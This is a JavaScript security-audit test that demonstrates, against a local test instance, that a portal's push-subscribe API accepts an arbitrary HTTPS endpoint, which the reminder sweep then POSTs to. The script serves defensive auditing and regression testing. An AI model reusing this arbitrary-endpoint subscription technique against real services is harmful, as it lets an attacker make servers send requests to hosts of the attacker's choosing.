/* Lead 8: a slug holder can register an arbitrary HTTPS endpoint and make
   the reminder sweep POST to it. */
import fs from 'node:fs';
import https from 'node:https';
import crypto from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { startPortal, session, mint, call, guard, sleep, vapid } from './lib.mjs';

guard('push-endpoint', async () => {
  const dir = '/work/tls';
  fs.mkdirSync(dir, { recursive: true });
  const keyPath = `${dir}/key.pem`;
  const certPath = `${dir}/cert.pem`;
  execFileSync('openssl', [
    'req', '-x509', '-newkey', 'rsa:2048', '-nodes',
    '-keyout', keyPath, '-out', certPath, '-days', '1',
    '-subj', '/CN=127.0.0.1',
    '-addext', 'subjectAltName=IP:127.0.0.1',
  ], { stdio: 'ignore' });

  const received = [];
  const server = https.createServer(
    { key: fs.readFileSync(keyPath), cert: fs.readFileSync(certPath) },
    (req, res) => {
      const chunks = [];
      req.on('data', c => chunks.push(c));
      req.on('end', () => {
        received.push({
          method: req.method,
          url: req.url,
          content_encoding: req.headers['content-encoding'] || '',
          bytes: Buffer.concat(chunks).length,
        });
        res.writeHead(201); res.end('ok');
      });
    },
  );
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;

  const keys = vapid();
  const p = await startPortal({
    STUDIO_PASSPHRASE: 'testpassphrase',
    VAPID_PUBLIC_KEY: keys.publicKey,
    VAPID_PRIVATE_KEY: keys.privateKey,
    VAPID_SUBJECT: 'mailto:audit@example.com',
    PUSH_RUN_SECRET: 'audit-push-secret',
    NODE_EXTRA_CA_CERTS: certPath,
  });

  try {
    const cookie = await session(p.base);
    const slug = 'pushend.t';
    await mint(p.base, cookie, { slug, name: 'Push Endpoint', status: 'active', pens: [{ template: 'glow' }] });

    // Attacker-controlled subscription keys and endpoint.
    const client = crypto.createECDH('prime256v1');
    client.generateKeys();
    const p256dh = client.getPublicKey().toString('base64url');
    const auth = crypto.randomBytes(16).toString('base64url');

    const sub = await call(p.base, '/api/push/subscribe', {
      method: 'POST',
      body: {
        slug,
        sub: { endpoint: `https://127.0.0.1:${port}/collect`, keys: { p256dh, auth } },
        due: [new Date(Date.now() - 60_000).toISOString()],
        tz: 'UTC',
      },
    });

    const run = await call(p.base, '/api/push/run', {
      method: 'POST',
      headers: { 'x-push-secret': 'audit-push-secret' },
    });

    for (let i = 0; i < 50 && received.length === 0; i++) await sleep(100);

    const expect = process.env.EXPECT || 'vulnerable';
    return {
      ok: expect === 'blocked'
        ? (sub.status === 400 && received.length === 0)
        : (received.length > 0 && received[0].method === 'POST' && received[0].content_encoding === 'aes128gcm'),
      expectation: expect,
      subscribe_status: sub.status,
      run_status: run.status,
      run_body: run.json,
      outbound_requests: received,
      endpoint_written: received.length === 1 ? '/collect' : null,
    };
  } finally {
    p.stop();
    server.close();
  }
});
